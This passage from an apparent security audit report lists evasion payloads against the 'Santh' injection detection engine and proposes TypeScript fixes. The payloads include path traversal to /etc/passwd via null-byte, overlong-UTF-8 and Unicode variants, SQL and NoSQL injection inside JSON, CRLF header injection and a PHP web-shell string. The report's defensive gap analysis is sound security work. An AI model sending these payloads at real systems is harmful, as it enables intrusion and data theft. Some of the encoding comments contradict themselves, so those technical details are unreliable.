### 5.2 Null Byte Injection (PARTIAL EVASION)

**Payload:**
```
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.png
../../../etc/passwd\0.gif
../../../etc/passwd%2500.php
../../../etc/passwd%00%00.jpg
```

**Why It Evades:**
- `pathNullTerminate` class (line 85) uses simple regex: `/%00|\\x00|\\0|\0/`
- Double-encoded null bytes (`%2500`) may not be caught if single-decode happens first
- Multiple null bytes in sequence may bypass single-match detection

**Current Detection (Gap):**
```typescript
// path/index.ts line 85
detect: (input: string): boolean => /%00|\\x00|\\0|\0/.test(input)
// Does not handle %2500 (URL-encoded %00) or repeated nulls
```

**Fix Required:**
```typescript
// Enhanced null byte detection
function detectNullByteVariants(input: string): boolean {
    const NULL_PATTERNS = [
        /%00/i,              // URL-encoded null
        /%2500/i,            // Double-encoded null
        /%252500/i,          // Triple-encoded null
        /\\x00/i,            // Hex escape
        /\\0/,               // Octal escape
        /\x00/,              // Raw null
        /&#0;|&#x0;/i,       // HTML entity null
    ];
    
    // Check for null byte with extension after it (classic bypass)
    const hasNull = NULL_PATTERNS.some(p => p.test(input));
    const hasExtensionAfterNull = /(?:%00|%2500|\x00|\0)[^/]*\.[a-z0-9]{1,8}$/i.test(input);
    
    return hasNull && hasExtensionAfterNull;
}
```

---

### 5.3 UTF-8 Overlong Sequences for / (EVASION CONFIRMED)

**Payload:**
```
..%c0%af..%c0%af..%c0%afetc/passwd     (overlong / - detected)
..%e0%80%af..%e0%80%af/etc/passwd     (3-byte overlong /)
..%f0%80%80%af/etc/passwd              (4-byte overlong /)
..%c1%9c..%c1%9c/etc/passwd            (alternative encoding)
```

**Why It Evades:**
- `encoding.ts` line 80 only handles `%c0%ae` (dot) and `%e0%80%ae` via `OVERLONG_SLASH_RE`
- Missing 3-byte and 4-byte overlong encodings of `/`
- The regex is: `/%c0%af|%e0%80%af/gi` - only 2 variants

**Current Detection (Gap):**
```typescript
// encoding.ts line 80
const OVERLONG_SLASH_RE = /%c0%af|%e0%80%af/gi
// Missing: %f0%80%80%af, %c1%9c, and other overlong variants
```

**Fix Required:**
```typescript
// Enhanced overlong UTF-8 detection
const OVERLONG_UTF8_PATTERNS = {
    // Overlong encoding of '/'
    slash: [
        /%c0%af/gi,           // 2-byte overlong /
        /%e0%80%af/gi,        // 3-byte overlong /
        /%f0%80%80%af/gi,     // 4-byte overlong /
        /%c1%9c/gi,           // Alternative 2-byte
    ],
    // Overlong encoding of '.'
    dot: [
        /%c0%ae/gi,           // 2-byte overlong .
        /%e0%80%ae/gi,        // 3-byte overlong .
        /%f0%80%80%ae/gi,     // 4-byte overlong .
        /%c1%9e/gi,           // Alternative 2-byte
    ],
    // Overlong encoding of '\'
    backslash: [
        /%c1%9c/gi,           // 2-byte overlong \
        /%c0%5c/gi,           // Alternative
    ],
};

function normalizeOverlongUtf8Comprehensive(input: string): string {
    let result = input;
    for (const patterns of Object.values(OVERLONG_UTF8_PATTERNS)) {
        for (const pattern of patterns) {
            result = result.replace(pattern, (match) => {
                if (match.toLowerCase().includes('af') || match.toLowerCase().includes('9c')) return '/';
                if (match.toLowerCase().includes('ae') || match.toLowerCase().includes('9e')) return '.';
                if (match.toLowerCase().includes('5c')) return '\\';
                return match;
            });
        }
    }
    return result;
}
```

---

### 5.4 Path Normalization Bypass via Unicode (EVASION CONFIRMED)

**Payload:**
```
..%ef%bc%8f..%ef%bc%8fetc/passwd      (fullwidth solidus U+FF0F)
..%ef%bc%8e..%ef%bc%8e/etc/passwd    (fullwidth full stop U+FF0E)
..%e2%88%95..%e2%88%95/etc/passwd    (division slash U+2215)
..%e2%88%96..%e2%88%96/etc/passwd    (dot operator U+2219 as dot)
```

**Why It Evades:**
- `deepDecode()` normalizes fullwidth characters (line 315-316) but this happens AFTER initial path checks
- Unicode character normalization may create `..` sequences after initial validation
- Division slash and other Unicode slash-like characters not handled

**Current Detection (Gap):**
```typescript
// encoding.ts lines 315-316
function normalizeFullwidth(s: string): string {
    return s.replace(/[\uFF01-\uFF5E]/g, c => String.fromCharCode(c.charCodeAt(0) - 0xFF00 + 0x20))
}
// Only handles U+FF01 to U+FF5E range, missing U+FF0F (／), U+FF0E (．), etc.
```

**Fix Required:**
```typescript
// Enhanced Unicode normalization for path traversal
const UNICODE_PATH_CHARS: Record<string, string> = {
    '\uFF0F': '/',   // Fullwidth solidus
    '\uFF0E': '.',   // Fullwidth full stop
    '\u2215': '/',   // Division slash
    '\u2216': '\\',  // Set minus (resembles backslash)
    '\u2044': '/',   // Fraction slash
    '\u2219': '.',   // Bullet operator (resembles dot)
    '\u00B7': '.',   // Middle dot
    '\u30FB': '.',   // Katakana middle dot
    '\uFF65': '.',   // Halfwidth katakana middle dot
};

function normalizeUnicodePathChars(input: string): string {
    return input.replace(
        new RegExp(Object.keys(UNICODE_PATH_CHARS).join('|'), 'g'),
        c => UNICODE_PATH_CHARS[c] || c
    );
}
```

---

## 6. ADDITIONAL CROSS-CUTTING GAPS

### 6.1 JSON-Based Injection (EVASION CONFIRMED)

**Payload:**
```json
{"query": "' UNION SELECT * FROM users--"}
{"username": "admin'--", "password": "anything"}
{"filter": {"$where": "this.password.match(/^.{0}admin/)"}}
```

**Why It Evades:**
- When input is JSON, the detection engine may analyze the JSON string literals without context
- SQL injection inside JSON values may be treated as benign strings
- No specific JSON-context detection for nested injection

**Fix Required:**
```typescript
// JSON injection context detection
function detectJsonInjection(input: string): boolean {
    try {
        const parsed = JSON.parse(input);
        const stringValues = extractStringValues(parsed);
        
        // Check each string value for injection patterns
        for (const value of stringValues) {
            if (detectSqlInjection(value) || detectXss(value) || detectCmdInjection(value)) {
                return true;
            }
        }
    } catch {
        return false;
    }
    return false;
}
```

---

### 6.2 HTTP Header Injection Context (EVASION CONFIRMED)

**Payload:**
```
X-Forwarded-For: 127.0.0.1\r\nX-Custom: evil
User-Agent: <?php system($_GET['cmd']); ?>
Referer: javascript:alert(1)
Cookie: session=abc123\r\n\r\nGET /admin HTTP/1.1
```

**Why It Evades:**
- Header values may not be decoded/processed the same way as body parameters
- CRLF injection in header context may bypass detection if only body is analyzed

---

## Summary of Recommended Fixes

| Priority | Attack Class | Evasion Technique | Implementation Complexity |
|----------|--------------|-------------------|---------------------------|
| CRITICAL | SQLi | GBK/BIG5 charset escape | Medium (new tokenizer logic) |
| CRITICAL | CMDi | Process substitution `<(cmd)` | Low (tokenizer extension) |
| CRITICAL | Path | UTF-8 overlong 3/4-byte | Low (regex extension) |
| HIGH | SQLi | Unicode normalization | Medium (extended homoglyphs) |
| HIGH | XSS | SVG foreignObject/animate | Low (pattern addition) |
| HIGH | CMDi | Base64 decode chains | Low (pattern addition) |
| HIGH | SSRF | IPv6 scope variants | Medium (parser extension) |
| MEDIUM | XSS | DOM clobbering __proto__ | Low (pattern addition) |
| MEDIUM | Path | Unicode path chars | Low (normalization) |
| MEDIUM | SQLi | Time in subqueries | Medium (recursive analysis) |

---

## Conclusion

The Santh invariant detection engine has a strong architectural foundation with L1/L2 detection layers. However, **attackers with knowledge of the detection logic can craft payloads that evade detection** using:

1. **Character encoding tricks** (multi-byte charsets, overlong UTF-8, Unicode homoglyphs)
2. **Structural obfuscation** (process substitution, base64 chains, nested subqueries)
3. **Context confusion** (JSON-wrapped injections, mXSS namespace abuse)
4. **Protocol/format abuse** (IPv6 variants, URL shortener chains)

**Immediate Actions Recommended:**
1. Extend shell tokenizer to handle process substitution `<(cmd)`
2. Add comprehensive multi-byte charset handling for SQL tokenizer
3. Expand Unicode normalization for path traversal detection
4. Implement recursive subquery analysis for time-based SQLi
5. Add base64 decode chain detection for command injection

---

*Report generated for security audit purposes. All findings based on static code analysis of the detection engine implementation.*
